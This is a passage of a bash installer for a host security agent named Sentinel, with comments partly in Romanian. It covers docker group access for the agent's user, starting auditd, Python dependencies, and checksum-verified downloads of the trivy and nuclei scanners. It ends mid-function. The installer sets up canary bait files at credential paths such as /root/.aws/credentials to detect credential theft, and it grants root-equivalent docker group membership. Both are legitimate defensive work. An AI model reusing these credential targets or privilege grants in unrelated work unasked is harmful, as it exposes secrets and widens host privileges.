#   apartenența e în /etc/group, dar daemonul e mut și
#     pentru root (ori n-avem cum să rulăm ca alt user)     nedovedit     true
#   orice altceva — grupul lipsește, `usermod` n-a prins,
#     sau root e servit și `sentinel` nu                    refuzat       false
#
# Regula din spatele tabelului: `true` se scrie doar când există o DOVADĂ a căii
# de acces. Fără ea se scrie `false`, fiindcă un `scan.containers: true` fără
# acces produce un rând `failed` în `scans` în fiecare noapte și o cheie roșie la
# `scan:last:trivy_image`, pe care nimeni nu le poate curăța de pe gazdă:
# scanerul nu poate să-și acorde singur apartenența.
#
# „Nedovedit" nu e „în regulă", și de asta are stare proprie și mesaj propriu:
# acolo `true` se sprijină pe intrarea din /etc/group, iar operatorul e anunțat
# explicit că EFECTUL nu a fost văzut.
#
# Ce costă apartenența — pe gazda asta grupul `docker` e echivalent cu root, deci
# o compromitere a agentului de securitate devine root pe mașina pe care o
# păzește — e scris în docs/ARHITECTURA.md §3.14 și în docstring-ul lui
# sentinel/scan/trivy_image.py. Operatorul a acceptat schimbul deliberat. Nu se
# repetă aici.
# ---------------------------------------------------------------------------

# Aceleași trei semne pe care le citește `probe_docker` din
# sentinel/scan/trivy_image.py, și în aceeași ordine. Un singur semn ar fi ori
# încredere în filesystem, ori încredere în configurație, iar fiecare dintre ele
# s-a dovedit deja greșită aici, în direcții opuse.
#
# Variabile, nu litere în cod, ca funcțiile să poată fi rulate și în altă parte
# decât pe /run — același motiv ca la AUDITD_RULES_DEST.
DOCKER_SOCKET_PATHS=(/run/docker.sock /var/run/docker.sock)
DOCKER_CLIENT_PATH=/usr/bin/docker
DOCKER_GROUP=docker

# Starea măsurată, și valoarea pe care o scrie pasul 26. GOALE până rulează
# `ensure_docker_access`: pasul 26 refuză să scrie o valoare pe care n-a
# măsurat-o nimeni, în loc să presupună una.
DOCKER_ACCESS_STATE=""
SCAN_CONTAINERS=""

# Ce a răspuns ultima interogare: versiunea serverului, și ultima linie de
# eroare.
#
# Amândouă ies prin variabile, nu pe stdout, iar asta e o reparație, nu un stil.
# Prima versiune a funcției de mai jos întorcea versiunea pe stdout, deci
# apelantul o citea cu `$(…)` — iar atribuirea lui DOCKER_PROBE_ERR se făcea
# atunci ÎNĂUNTRUL substituției de comandă și murea cu subshell-ul. Efectul
# măsurat pe VM-ul de test: daemon oprit, stderr cu explicația, instalatorul
# tipărea „fără mesaj" — exact linia de care operatorul are nevoie ca să știe ce
# să repare, pierdută în tăcere.
#
# Același tipar ca la `read_instance_id_file`/`INSTANCE_ID_READ`: rezultatul
# într-o variabilă, codul de ieșire doar pentru „a mers sau nu".
DOCKER_SERVER_VERSION=""
DOCKER_PROBE_ERR=""

docker_is_present() {
    if have docker || [[ -x "$DOCKER_CLIENT_PATH" ]]; then
        return 0
    fi
    local sock
    for sock in "${DOCKER_SOCKET_PATHS[@]}"; do
        if [[ -e "$sock" ]]; then
            return 0
        fi
    done
    [[ -n "${DOCKER_HOST:-}" ]]
}

# Versiunea SERVERULUI, cerută de un anume utilizator, cu grupurile lui.
#
# `--format '{{.Server.Version}}'` nu e cosmetică, e miezul verificării:
# `docker version` FĂRĂ format iese cu 0 și tipărește blocul clientului chiar și
# când daemonul nu răspunde. Codul de ieșire singur e trapa — MĂSURAT, vezi
# tests/security/test_installer_docker_access.py. Deci se cere ȘI cod 0, ȘI o
# versiune nevidă.
#
#   0  daemonul a răspuns; versiunea e în DOCKER_SERVER_VERSION
#   1  am întrebat și n-am primit o versiune de server; motivul e în DOCKER_PROBE_ERR
#   2  n-am avut CUM să întreb ca utilizatorul acela — altceva decât un refuz
docker_server_version_as() {
    local user="$1" out="" rc=0 errfile
    DOCKER_SERVER_VERSION=""
    DOCKER_PROBE_ERR=""
    errfile="$(mktemp)"

    if [[ "$user" == "root" ]]; then
        out="$(docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    elif have runuser; then
        # `runuser -u` execută comanda DIRECT, fără shell, și reface lista de
        # grupuri din /etc/group. Contează: `sentinel` are /sbin/nologin, deci
        # `su - sentinel -c …` n-ar rula nimic și ar raporta un eșec care n-are
        # nicio legătură cu docker.
        out="$(runuser -u "$user" -- docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    elif have sudo; then
        out="$(sudo -n -u "$user" -- docker version --format '{{.Server.Version}}' 2>"$errfile")" || rc=$?
    else
        rm -f "$errfile"
        DOCKER_PROBE_ERR="nu există nici runuser, nici sudo pe gazda asta"
        return 2
    fi

    # `|| true`: `pipefail` e activ, iar un stderr GOL face `grep` să iasă 1.
    # Fără el, o interogare REUȘITĂ ar opri instalatorul întreg.
    DOCKER_PROBE_ERR="$(tr -d '\r' < "$errfile" \
                        | grep -v '^[[:space:]]*$' | tail -n1)" || true
    rm -f "$errfile"

    out="$(printf '%s' "$out" | tr -d '[:space:]')"
    if (( rc != 0 )) || [[ -z "$out" ]]; then
        return 1
    fi
    DOCKER_SERVER_VERSION="$out"
    return 0
}

# Apartenența așa cum o vede sistemul, nu așa cum am cerut-o. Dovedește intrarea
# din /etc/group și ATÂT — nu că daemonul răspunde. De asta e doar sprijinul
# ramurii „nedovedit", niciodată dovada principală.
sentinel_in_docker_group() {
    id -nG "$SENTINEL_USER" 2>/dev/null | tr ' ' '\n' | grep -qx "$DOCKER_GROUP"
}

# Ce cere configurația VIE de pe gazdă. Trei răspunsuri, fiindcă „nu pot citi
# fișierul" și „scrie false" nu sunt același lucru: primul e o gazdă pe care
# operatorul nu s-a pronunțat (instalare nouă), al doilea e un refuz explicit.
#
# `awk` delimitat la blocul `scan:`, nu un `grep containers:` peste tot fișierul:
# `containers` e un cuvânt destul de generic încât o cheie cu același nume din
# altă secțiune să fie citită drept răspunsul operatorului. O cheie de nivel zero
# începe linia în coloana 0, deci blocul se delimitează exact.
config_containers_setting() {
    local cfg="${SENTINEL_CONFIG_DIR}/sentinel.yaml" value=""
    [[ -r "$cfg" ]] || { printf 'unknown'; return 0; }
    value="$(awk '
        /^[^[:space:]#]/ { in_scan = ($0 ~ /^scan:[[:space:]]*(#.*)?$/); next }
        in_scan && $1 == "containers:" { print $2; exit }
    ' "$cfg" 2>/dev/null)" || value=""
    case "$value" in
        true)  printf 'true' ;;
        false) printf 'false' ;;
        *)     printf 'unknown' ;;
    esac
}

ensure_docker_access() {
    DOCKER_ACCESS_STATE=""
    SCAN_CONTAINERS=""

    if ! docker_is_present; then
        DOCKER_ACCESS_STATE=absent
        SCAN_CONTAINERS=false
        info "docker nu e pe gazda asta: nici clientul, nici ${DOCKER_SOCKET_PATHS[*]}, \
nici DOCKER_HOST. Nu e o eroare — e o gazdă fără containere."
        info "scan.containers se scrie false, ca să nu se ceară o scanare care n-are ce scana."
        return 0
    fi

    # Alegerea operatorului, dacă a făcut-o, se citește ÎNAINTE de orice
    # acordare. §3.14 spune că ieșirea din schimb e `scan.containers: false`
    # ÎMPREUNĂ cu scoaterea din grup; un instalator care re-acordă apartenența la
    # fiecare deploy pe o gazdă unde scanarea e oprită păstrează tot costul și
    # niciun beneficiu — și, fiindcă funcția asta rulează necondiționat, ar face-o
    # de fiecare dată.
    local wanted; wanted="$(config_containers_setting)"
    if [[ "$wanted" == "false" ]]; then
        DOCKER_ACCESS_STATE=disabled
        SCAN_CONTAINERS=false
        info "docker e pe gazda asta, dar ${SENTINEL_CONFIG_DIR}/sentinel.yaml are \
scan.containers: false, deci apartenența la grupul ${DOCKER_GROUP} NU se acordă."
        # Fără linia asta ramura e o fundătură tăcută: pe o gazdă unde docker a
        # apărut DUPĂ instalare, `false` a fost scris chiar de instalator (docker
        # lipsea atunci), iar `install_config` nu rescrie un sentinel.yaml viu.
        # Nimic de pe gazdă nu i-ar mai spune operatorului că scanarea
        # containerelor e la un cuvânt distanță.
        info "Ca s-o pornești: pune scan.containers: true în \
${SENTINEL_CONFIG_DIR}/sentinel.yaml și re-rulează deploy-ul. Abia atunci se acordă \
apartenența — și citește întâi docs/ARHITECTURA.md §3.14."
        if sentinel_in_docker_group; then
            warn "${SENTINEL_USER} e totuși în grupul ${DOCKER_GROUP}, iar grupul ăla e \
echivalent cu root aici (docs/ARHITECTURA.md §3.14). Cu scanarea oprită, asta e tot costul \
și niciun beneficiu. Scoate-l:  gpasswd -d ${SENTINEL_USER} ${DOCKER_GROUP}"
        fi
        return 0
    fi

    # Întâi efectul, apoi acordarea. Pe a doua rulare — și pe fiecare deploy de
    # după — asta face funcția o operație nulă DOVEDITĂ: daemonul a răspuns, deci
    # nu se atinge nimic. Un `usermod` „oricum idempotent" ar fi tot o presupunere.
    local rc=0
    docker_server_version_as "$SENTINEL_USER" || rc=$?
    if (( rc == 0 )); then
        DOCKER_ACCESS_STATE=ready
        SCAN_CONTAINERS=true
        ok "docker răspunde ca ${SENTINEL_USER}: server ${DOCKER_SERVER_VERSION}. \
Nimic de acordat."
        return 0
    fi
    local why="${DOCKER_PROBE_ERR:-fără mesaj}"

    if getent group "$DOCKER_GROUP" >/dev/null; then
        warn "apartenența la grupul ${DOCKER_GROUP} e echivalentă cu root pe gazda asta — \
vezi docs/ARHITECTURA.md §3.14. E cerută de scanarea imaginilor de container."
        usermod -aG "$DOCKER_GROUP" "$SENTINEL_USER" \
            || warn "usermod -aG ${DOCKER_GROUP} ${SENTINEL_USER} a raportat un eșec; \
efectul e măsurat mai jos oricum, fiindcă nici reușita lui n-ar fi fost o dovadă."
    else
        warn "grupul ${DOCKER_GROUP} nu există pe gazda asta, deci apartenența NU poate fi \
acordată."
    fi

    rc=0
    docker_server_version_as "$SENTINEL_USER" || rc=$?
    if (( rc == 0 )); then
        DOCKER_ACCESS_STATE=granted
        SCAN_CONTAINERS=true
        ok "${SENTINEL_USER} a fost adăugat în grupul ${DOCKER_GROUP} și daemonul îi \
răspunde: server ${DOCKER_SERVER_VERSION}."
        info "Procesele sentinel deja pornite păstrează setul VECHI de grupuri — systemd \
le rezolvă la pornirea unității, nu la daemon-reload. Pasul 32 repornește fiecare unitate, \
iar sentinel-scan e Type=oneshot, deci ia grupurile noi la următoarea declanșare a \
temporizatorului."
        return 0
    fi
    why="${DOCKER_PROBE_ERR:-$why}"

    # Nu ajungem la daemon ca `sentinel`. Două cauze foarte diferite, despărțite
    # de o a doua întrebare, pusă lui root: dacă nici root nu primește o versiune
    # de server, daemonul e mut pentru toată lumea și refuzul nu e despre
    # apartenență.
    local unaskable=0 daemon_silent=0
    if (( rc == 2 )); then
        unaskable=1
    elif ! docker_server_version_as root; then
        daemon_silent=1
    fi

    if sentinel_in_docker_group && (( unaskable || daemon_silent )); then
        DOCKER_ACCESS_STATE=unproven
        SCAN_CONTAINERS=true
        warn "apartenența lui ${SENTINEL_USER} la grupul ${DOCKER_GROUP} e în /etc/group, \
dar EFECTUL nu a putut fi dovedit: ${why}"
        if (( daemon_silent )); then
            warn "daemonul docker nu răspunde nici lui root, deci refuzul nu e despre \
apartenență. Pornește-l  (systemctl status docker)  și uită-te apoi la cheia \
scan:last:trivy_image."
        else
            warn "nu există nici runuser, nici sudo pe gazda asta, deci nu am cum să rulez \
docker CA ${SENTINEL_USER}. Verifică tu:  runuser -u ${SENTINEL_USER} -- docker version \
--format '{{.Server.Version}}'"
        fi
        warn "scan.containers rămâne true fiindcă intrarea din /etc/group e o dovadă a CĂII \
de acces — dar nu e o dovadă a efectului. Dacă daemonul rămâne mut, scanerul scrie un rând \
failed în fiecare noapte și cheia scan:last:trivy_image se face roșie."
        return 0
    fi

    DOCKER_ACCESS_STATE=denied
    SCAN_CONTAINERS=false
    warn "docker e pe gazda asta, dar ${SENTINEL_USER} NU ajunge la daemon: ${why}"
    if ! getent group "$DOCKER_GROUP" >/dev/null; then
        warn "cauza vizibilă: grupul ${DOCKER_GROUP} nu există. Un client docker care e de \
fapt un înveliș peste podman arată exact așa, și acolo apartenența n-are ce să acorde."
    elif ! sentinel_in_docker_group; then
        warn "cauza vizibilă: după usermod -aG, id -nG ${SENTINEL_USER} tot nu arată \
${DOCKER_GROUP}."
    else
        warn "cauza vizibilă: root primește un răspuns de la daemon și ${SENTINEL_USER} nu \
— apartenența e scrisă, dar socketul o refuză oricum."
    fi
    warn "De asta scan.containers se scrie FALSE, și nu e o preferință: un true fără acces \
ar produce un rând failed în fiecare noapte, iar scanerul nu poate să-și acorde singur \
apartenența."
    if [[ "$wanted" == "true" ]]; then
        warn "ATENȚIE: ${SENTINEL_CONFIG_DIR}/sentinel.yaml de pe gazdă are DEJA \
scan.containers: true, iar install_config nu rescrie un fișier viu — scrie sentinel.yaml.new \
lângă el. Până schimbi valoarea cu mâna, scanarea containerelor eșuează în fiecare noapte."
    fi
}

# --- 20 -------------------------------------------------------------------
# The path the collector opens, and the one named in sentinel.yaml.tmpl. One
# constant, so the check that decides `ingest.auditd` and the file the collector
# reads cannot drift apart without somebody noticing.
AUDITD_LOG_PATH=/var/log/audit/audit.log

# Where step 37 drops the rules file. A variable for the same reason as the
# path above: so the step that installs and verifies it can be run somewhere
# that is not /etc.
AUDITD_RULES_DEST=/etc/audit/rules.d/sentinel.rules

# The two bait files (functionality 05), overridable for the same reason as
# the paths above: a test has to be able to run this against a tmp directory
# instead of a real /root. The paths themselves are also duplicated in
# deploy/audit/sentinel.rules, which is a static file and cannot read a shell
# variable — tests/security/test_audit_rules_scope.py ties the two together.
CANARY_PGPASS_PATH="${CANARY_PGPASS_PATH:-/root/.pgpass}"
CANARY_AWS_CREDS_PATH="${CANARY_AWS_CREDS_PATH:-/root/.aws/credentials}"

# What install_canary_baits planted last time: path and size, in bytes, one
# pair per line. A repeat deploy reads THIS, not the bait's content, to decide
# whether a bait already at one of the two paths above is its own -- see the
# function for why. Overridable for the same reason as every other path here:
# a test must not write under a real /etc/sentinel.
CANARY_STATE_PATH="${CANARY_STATE_PATH:-${SENTINEL_CONFIG_DIR}/canary-state}"

# auditd installed is not auditd running, and only the running one produces
# anything.
#
# Measured on Ubuntu 24.04.4 right after the package went in: systemd reported
# auditd.service as `enabled`, `systemctl is-active auditd` said `inactive`, and
# /var/log/audit was EMPTY. Debian's postinst enables the unit without starting
# it. Left like that, the host has the package, gets the rules written at step
# 37, and collects nothing at all until somebody reboots it — which is the same
# outcome as not installing auditd, reached by a longer route.
#
# `enable --now`, not `restart`: on every host where auditd is already up — all
# the RHEL ones — a restart would be a change to a service that was fine, and
# auditd is not a service one bounces for no reason. And then the EFFECT is what
# is checked: the daemon is active AND the log file has appeared. The file does
# not exist the instant the unit starts, so it is waited for rather than
# assumed; an instant check would report a working auditd as broken.
AUDITD_LOG_WAIT_S=10

ensure_auditd_running() {
    have auditctl || return 1
    if ! systemctl is-active --quiet auditd 2>/dev/null; then
        systemctl enable --now auditd >/dev/null 2>&1 || true
    fi
    systemctl is-active --quiet auditd 2>/dev/null || return 1

    local waited=0
    while (( waited < AUDITD_LOG_WAIT_S )); do
        [[ -f "$AUDITD_LOG_PATH" ]] && return 0
        sleep 1; waited=$((waited + 1))
    done
    return 1
}

# Can this interpreter build Sentinel's venv, and compile against its headers?
#
# Two facts, asked of the interpreter itself rather than of dpkg or rpm:
#
#   ensurepip importable   `python -m venv` fails without it, with
#                          "ensurepip is not available" — step 23
#   Python.h readable      systemd-python==235 is a C extension built at pip
#                          time; without headers step 23 dies in a compiler
#
# Neither is a claim about a package name, which is what makes this survive the
# next distribution to split its Python differently.
python_can_venv() { "$1" -c 'import ensurepip' >/dev/null 2>&1; }

python_has_headers() {
    local inc
    inc="$("$1" -c 'import sysconfig; print(sysconfig.get_paths()["include"])' 2>/dev/null)" || return 1
    [[ -n "$inc" && -r "${inc}/Python.h" ]]
}

# Install what is missing, then ASK AGAIN.
#
# The old code installed the Python group only when python_find failed. On
# Ubuntu 24.04 python3 is 3.12.3, which clears the 3.10 floor, so the block was
# skipped entirely and python3.12-venv / python3.12-dev were never installed —
# measured: `dpkg -l` reported both as `un`. The install then died 200 lines
# later at step 23 with an error about the venv, which is the symptom, not the
# cause. RHEL never saw it because AlmaLinux's python3 is 3.9, below the floor,
# so the block always ran there.
#
# Driven by the two facts and not by the family: on a host where both already
# hold — every RHEL host that installs today — nothing is installed and nothing
# changes. The package install itself is best-effort on purpose; whether it
# worked is decided by re-asking the interpreter, not by apt's exit code.
ensure_python_build_deps() {
    local py="$1" missing=() pkgs=() p
    python_can_venv "$py"    || missing+=("venv")
    python_has_headers "$py" || missing+=("headers")
    if (( ${#missing[@]} == 0 )); then
        ok "${py} already has venv and headers"
        return 0
    fi

    while read -r p; do pkgs+=("$p"); done < <(python_support_pkgs "$py")
    if (( ${#pkgs[@]} )); then
        local what
        what="$(printf '%s and ' "${missing[@]}")"; what="${what% and }"
        info "${py} is missing ${what}; installing ${pkgs[*]}"
        pkg_install "${pkgs[@]}" >/dev/null 2>&1 || \
            warn "installing ${pkgs[*]} reported a failure; checking what is on the host anyway"
    else
        warn "${py} would not say which version it is, so there are no package \
names to install for it"
    fi

    missing=()
    python_can_venv "$py"    || missing+=("ensurepip — '${py} -m venv' will fail")
    python_has_headers "$py" || missing+=("Python.h — systemd-python will not compile")
    if (( ${#missing[@]} )); then
        die "${py} still cannot build Sentinel's venv:
    $(printf '%s\n    ' "${missing[@]}")
    Install ${pkgs[*]-the venv and development packages for ${py}} by hand and re-run."
    fi
    ok "${py} can build a venv and has its headers"
}

step_packages() {
    # Recorded BEFORE the install, because it decides whether nginx.conf is ours
    # to edit later. If nginx was already serving the operator's sites, its
    # config belongs to them.
    #
    # Write-once, and that is the repair. The observation below is only
    # meaningful the FIRST time it is made: from the second deploy on,
    # `pkg_installed nginx` is true because WE installed it. A step 20 that ran
    # again — --force-step 20, --from-step 20, or a reinstall — used to append
    # NGINX_WAS_PREEXISTING=1 to preflight.env about our own package;
    # resolve_config sourced that on every later run, and step 33 then spent
    # every deploy printing "Not touching nginx.conf — it is yours" about a file
    # this installer had written.
    local observed=0
    if pkg_installed nginx || systemctl is-active --quiet nginx 2>/dev/null; then
        observed=1
    fi
    NGINX_WAS_PREEXISTING="$(fact_record_once "$NGINX_PREEXISTING_FACT" "$observed")"
    if [[ "$NGINX_WAS_PREEXISTING" == "1" ]]; then
        info "nginx was on this host before Sentinel — its configuration will not be modified"
    elif (( observed )); then
        info "nginx is installed, but the first deploy recorded that it was NOT \
here before us. The package is ours, so step 33 may take its :80 listener out \
of service."
    fi

    info "installing base packages on ${DISTRO_PRETTY} (a few minutes on a fresh host)"
    pkg_refresh
    pkg_enable_extra_repos || warn "extra repositories unavailable; Suricata may be missing"

    # An interpreter first: everything else is easier once we know which one.
    # The names differ per family, so try each candidate set until one resolves.
    if ! python_find >/dev/null; then
        local group installed=0
        while read -r group; do
            # shellcheck disable=SC2086
            if pkg_install $group >/dev/null 2>&1; then installed=1; break; fi
        done < <(python_pkg_names)
        (( installed )) || die "could not install a Python >= 3.${PYTHON_MIN_MINOR}"
    fi
    PYTHON_BIN="$(python_find)" || die "no Python >= 3.${PYTHON_MIN_MINOR} after install"
    printf 'PYTHON_BIN=%q\n' "$PYTHON_BIN" >> "${STATE_MARKERS}/preflight.env"
    info "using ${PYTHON_BIN} ($("$PYTHON_BIN" -V 2>&1))"

    # An interpreter that exists is not an interpreter that can build the venv.
    ensure_python_build_deps "$PYTHON_BIN"

    # Shared roles, per-family names. `systemd-devel` / `libsystemd-dev` matter
    # most: systemd-python is a C extension built at pip time, and without the
    # headers the venv step dies with "Package 'libsystemd' ... not found".
    local pkgs=()
    while read -r p; do pkgs+=("$p"); done < <(pkg_names_core)
    pkg_install "${pkgs[@]}" || die "package installation failed"

    # auditd is where every host.* detection comes from. Not fatal — Sentinel
    # still watches journald, nginx and Suricata without it — but never silent:
    # a host with no auditd is a host with a whole class of detection missing,
    # and step 26 writes that fact into the configuration instead of pretending.
    if ! have auditctl; then
        warn "auditd is not installed on this host. Every host.* detection, plus \
auth.new_user and auth.new_ssh_key, comes from it and will not fire."
    elif ensure_auditd_running; then
        ok "auditd running and writing ${AUDITD_LOG_PATH}"
    else
        warn "auditd is installed but ${AUDITD_LOG_PATH} is not being written \
(service state: $(systemctl is-active auditd 2>/dev/null || echo unknown)). The rules \
installed at step 37 will load into the kernel and nothing will collect their records. \
Inspect with:  systemctl status auditd"
    fi

    # Optional extras: a missing one degrades a feature, it does not stop setup.
    pkg_install git certbot >/dev/null 2>&1 || \
        warn "git/certbot unavailable; TLS issuance may need doing by hand"
    if [[ "$DISTRO_FAMILY" == "rhel" ]]; then
        pkg_install policycoreutils-python-utils >/dev/null 2>&1 || true
    fi

    pg_bootstrap || die "PostgreSQL install failed"
    ok "base packages installed"
}

# --- 21 -------------------------------------------------------------------
# How long a freshly installed tool gets to answer ONE version query. There is a
# ceiling because `nuclei -version` also asks projectdiscovery whether a newer
# release exists: on a host with no route out, an unbounded probe would hang the
# installer here rather than report anything.
#
# The window per TOOL is three times this constant, not this constant:
# tool_version_line tries --version, then -version, then version, and each
# attempt carries its own `timeout`. A binary that hangs on all three therefore
# costs 3 x 20 = 60 seconds, and the two-tool manifest can spend two minutes
# here before the step says a word. Measured against a binary that sleeps, with
# TOOL_PROBE_TIMEOUT_S=2: 6.6 seconds for one tool. The window is accepted as it
# stands; what was wrong was this comment, which named 20 — the wrong number to
# give an operator wondering how long a silent step is allowed to stay silent.
TOOL_PROBE_TIMEOUT_S=20

# Where external binaries land. A defaulted variable rather than a bare
# literal, in the same shape as SENTINEL_PREFIX and friends in lib/common.sh,
# so tests/security/test_installer_external_tools.py can run the SHIPPED step
# against a temporary directory instead of the machine's real /usr/local/bin.
# Nothing in the installer or in deploy.sh ever sets it; a test pins the
# default so it cannot drift.
TOOLS_BIN_DIR="${TOOLS_BIN_DIR:-/usr/local/bin}"

# Proof that the binary RUNS on this host — not that a file with that name
# exists, which is a different and much weaker claim. An amd64 build on arm64
# exits 126, a truncated file exits 126 or 2, and a directory left behind by a
# failed unpack is not executable at all. None of those reach exit 0 with output.
#
# The flag differs per tool (cobra wants --version, goflags wants -version), so
# each is tried in turn. Output is captured with 2>&1 on purpose: nuclei prints
# its banner and its version line to stderr. With 2>/dev/null nuclei's probe
# would look empty and a perfectly good install would be reported as unproven.
tool_version_line() {
    local bin="$1" flag out ver
    for flag in --version -version version; do
        out="$(timeout "$TOOL_PROBE_TIMEOUT_S" "$bin" "$flag" 2>&1)" || continue
        [[ -n "$out" ]] || continue
        # The version number wherever it sits in the output: trivy answers with
        # one plain line, nuclei with an ASCII banner ahead of it.
        ver="$(printf '%s\n' "$out" | tr -d '\r' | grep -m1 -oE '[0-9]+\.[0-9]+\.[0-9]+[A-Za-z0-9.+-]*' || true)"
        [[ -n "$ver" ]] || ver="$(printf '%s\n' "$out" | tr -d '\r' | head -1)"
        printf '%s' "$ver"
        return 0
    done
    return 1
}

# The archive format is read from the first bytes of the file, not from the URL:
# once the checksum has matched we know exactly which bytes we hold, and the
# bytes are the truth about them. This matters because trivy publishes .tar.gz
# while nuclei publishes ONLY .zip for Linux (linux_386, linux_amd64, linux_arm,
# linux_arm64 — there is no tar.gz), so a step that only knows tar could never
# install nuclei at all.
tool_archive_kind() {
    local f="$1" magic
    magic="$(od -An -N4 -tx1 < "$f" 2>/dev/null | tr -d ' \n')"
    case "$magic" in
        1f8b*)                      printf 'gzip' ;;
        504b0304|504b0506|504b0708) printf 'zip' ;;
        *)                          return 1 ;;
    esac
}

# Unpacks into a staging directory, never straight into /usr/local/bin: these
# archives also carry LICENSE and README, and the old fallback
# `tar -xzf -C /usr/local/bin` sprayed them there whenever the targeted
# extraction missed.
tool_extract() {
    local archive="$1" dest="$2" kind
    kind="$(tool_archive_kind "$archive")" || return 1
    case "$kind" in
        gzip)
            tar -xzf "$archive" -C "$dest"
            ;;
        zip)
            # `unzip` is NOT in pkg_names_core (deploy/lib/distro.sh), so on a
            # minimal host it may simply not be there. It was not added to that
            # list because pkg_install of the core set is a `die` path, and a
            # package missing from one repository would then stop the whole
            # install over a zip reader. Python is the guaranteed fallback
            # instead: step 20 dies unless it can produce a Python >= 3.x, and
            # records it in PYTHON_BIN. bsdtar was not used — it is guaranteed
            # on neither family (own package on RHEL, libarchive-tools on Debian).
            #
            # `python -m zipfile` drops the executable bit. Harmless here,
            # because `install -m 0755` below sets it — and, unlike the version
            # this replaces, the result is then actually verified.
            if have unzip; then
                unzip -q -o "$archive" -d "$dest"
            elif [[ -n "${PYTHON_BIN:-}" ]] && "$PYTHON_BIN" -c 'import zipfile' 2>/dev/null; then
                "$PYTHON_BIN" -m zipfile -e "$archive" "$dest"
            elif have python3 && python3 -c 'import zipfile' 2>/dev/null; then
                python3 -m zipfile -e "$archive" "$dest"
            else
                return 1
            fi
            ;;
    esac
}

# Skipping a tool that is already on PATH is right: one put there by the
# operator or by the distribution is not ours to overwrite. What was wrong was
# the old report of it — `ok "${name} already installed"` — which let the
# operator believe the pinned version was the one on the host. It can be any
# other, and an old scanner reports fewer findings without ever complaining.
# So say what is actually there, and say when it differs from what is pinned.
#
# Returns 0 only when the tool on PATH was proved to BE the pinned version.
# Anything else — a different version, or one that would not say — returns 1,
# so the caller counts it as unproven and the step's closing line cannot go
# green over it. "Present" and "the version we reviewed" are not the same claim.
tool_report_existing() {
    local name="$1" url="$2" path found pinned=""
    path="$(command -v "$name")"
    # The pinned version, read out of the URL: GitHub releases are
    # .../download/vX.Y.Z/<asset>. If a URL ever stops looking like that we
    # simply do not claim to know, rather than guessing.
    if [[ "$url" == */download/*/* ]]; then
        pinned="${url##*/download/}"; pinned="${pinned%%/*}"; pinned="${pinned#v}"
    fi
    if ! found="$(tool_version_line "$path")"; then
        warn "${name} is already on PATH at ${path}, but it did not answer a version \
query — Sentinel cannot tell which build it is. Left alone; verify it by hand."
        return 1
    fi
    # Equality, not `*"$pinned"*`. The substring test reported a host as being
    # at the pinned version whenever the pin was a PREFIX of what is installed:
    # nuclei is on 3.11.x today, so a host carrying 3.11.10 against a manifest
    # pinning 3.11.1 was announced as "already installed" at the pinned build.
    # An unreviewed scanner, reported as the reviewed one — the exact claim this
    # function was added to stop making, and one patch release away from real.
    #
    # `found` is already a bare version token in every case that can be proved:
    # tool_version_line greps `X.Y.Z...` out of the output and only falls back
    # to a whole line when there is no version in it at all. In that fallback
    # nothing can be proved, and equality correctly refuses to claim otherwise.
    # A build answering `0.74.0-dev` against a pin of `0.74.0` is refused for
    # the same reason: it is not the build whose checksum sits in the manifest.
    if [[ -n "$pinned" && "$found" != "$pinned" ]]; then
        warn "${name} on PATH at ${path} reports ${found}, but the manifest pins \
${pinned}. Left alone — remove it and re-run step 21 to get the pinned build."
        return 1
    fi
    ok "${name} already installed at ${path}: ${found}"
}

step_external_tools() {
    # Never `curl | bash`. Every external binary is downloaded, checksummed
    # against a pinned value, and only then installed — a security tool that
    # pipes the internet into a shell has no business auditing anything.
    #
    # And, just as important: nothing is reported as installed because an unpack
    # command returned 0. What shipped here wrote `ok "${name} installed"`
    # unconditionally, after two tar attempts that could BOTH fail, with the
    # chmod that would have caught it neutralised by `|| true`. Nothing in the
    # step ever looked at /usr/local/bin. That is the CLAUDE.md pattern —
    # confirming the intention instead of the effect — sitting inside the step
    # that installs the security tooling. What is checked now: the file is at
    # the destination, it is executable, and it answers a version query here.
    #
    # The step stays tolerant: a release that 404s, an unreadable archive or a
    # binary for the wrong architecture must not stop an install that is mostly
    # about auditd, nftables and the database. So none of these paths `die`.
    # They print `[x]`/`[!]` per tool and close with a counted verdict line —
    # a `warn`, because WARN_COUNT is what the end-of-run summary prints (see
    # main()); FAIL_COUNT is incremented and read nowhere.
    local manifest="${SCRIPT_DIR}/tools/manifest.txt"
    if [[ ! -f "$manifest" ]]; then
        warn "no tools manifest at ${manifest}; skipping Trivy/nuclei. \
Vulnerability scanning (P7) will not be available until they are installed."
        return 0
    fi

    local name url sha work tmp src ver
    local n_ok=0 n_present=0 n_unproven=0 n_bad=0
    # `|| [[ -n "$name" ]]` picks up the last line of a manifest saved without a
    # trailing newline: without it `read` returns 1 and that tool is skipped in
    # complete silence, which is the same lie in a new place.
    while read -r name url sha || [[ -n "$name" ]]; do
        [[ -z "$name" || "$name" == \#* ]] && continue
        if [[ -z "$url" || -z "$sha" ]]; then
            fail "manifest entry '${name}' is incomplete (want: <name> <url> <sha256>); NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi

        if have "$name"; then
            if tool_report_existing "$name" "$url"; then
                n_present=$((n_present + 1))
            else
                n_unproven=$((n_unproven + 1))
            fi
            continue
        fi

        # mktemp, not a fixed /tmp/sentinel-<name>.tar.gz: that path was
        # predictable and written as root into a world-writable directory. The
        # extension went with it — it described only one of the two formats.
        work="$(mktemp -d "/tmp/sentinel-tool-${name}.XXXXXX")" || {
            fail "cannot create a staging directory for ${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        }
        tmp="${work}/archive"

        info "downloading ${name}"
        if ! curl -fsSL --max-time 120 -o "$tmp" "$url"; then
            rm -rf "$work"
            warn "download failed: ${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        if ! printf '%s  %s\n' "$sha" "$tmp" | sha256sum -c --status; then
            rm -rf "$work"
            fail "checksum mismatch for ${name}. Refusing to install. This is either a \
corrupted download or a compromised mirror — do not work around it."
            n_bad=$((n_bad + 1)); continue
        fi

        if ! tool_extract "$tmp" "$work"; then
            rm -rf "$work"
            fail "could not unpack the ${name} archive — unrecognised format, or no \
extractor for it (a .zip needs unzip or python3). ${name} is NOT installed."
            n_bad=$((n_bad + 1)); continue
        fi

        # The binary wherever the archive put it: at the root for trivy and
        # nuclei, possibly a level down for something else. If it is nowhere,
        # the unpack succeeded and there is still nothing to install — exactly
        # the case the old code reported as `ok`.
        src="$(find "$work" -mindepth 1 -type f -name "$name" -print -quit 2>/dev/null || true)"
        if [[ -z "$src" ]]; then
            rm -rf "$work"
